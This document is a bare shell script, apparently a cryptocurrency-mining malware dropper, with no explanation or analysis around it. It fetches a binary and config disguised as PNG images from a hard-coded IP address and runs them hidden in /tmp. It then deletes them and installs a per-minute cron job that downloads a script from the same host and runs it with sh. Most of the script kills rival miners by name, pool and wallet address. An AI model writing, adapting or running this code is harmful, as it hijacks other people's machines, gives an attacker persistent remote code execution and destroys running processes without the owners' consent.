export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
days=$(($(date +%s) / 60 / 60 / 24))
DoMine()
{
    curl -o /tmp/Circle_MI.png http://104.130.2.23/assets/Circle_MI.png
    curl -o /tmp/Circle_CF.png http://104.130.2.23/assets/Circle_CF.png
    chmod +x /tmp/Circle_MI.png
    nohup /tmp/Circle_MI.png -c /tmp/Circle_CF.png > /dev/null 2>&1 &
    sleep 10
    rm -rf /tmp/Circle_MI.png
    rm -rf /tmp/Circle_CF.png
    echo '*/1 * * * * curl 104.130.2.23/assets/Circle_AA.png|sh' > /tmp/.cron
    crontab /tmp/.cron
    sleep 3
    rm /tmp/.cron
}
ps auxf|grep -v grep|grep ${days}|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "logind.conf"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworker"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr"|awk '{print $2}'|xargs kill -9
pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4 
pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB 
pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df 
pkill -f cpuloadtest 
pkill -f crypto-pool 
pkill -f xmr 
pkill -f prohash 
pkill -f monero 
pkill -f miner
pkill -f nanopool 
pkill -f minergate
pkill -f yam
pkill -f yam2
pkill -f minerd
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "crypto-pool"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "prohash"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "miner"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "nanopool"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "minergate"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"|awk '{print $2}'|xargs kill -9 
ps auxf|grep -v grep|grep "479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "11231" || DoMine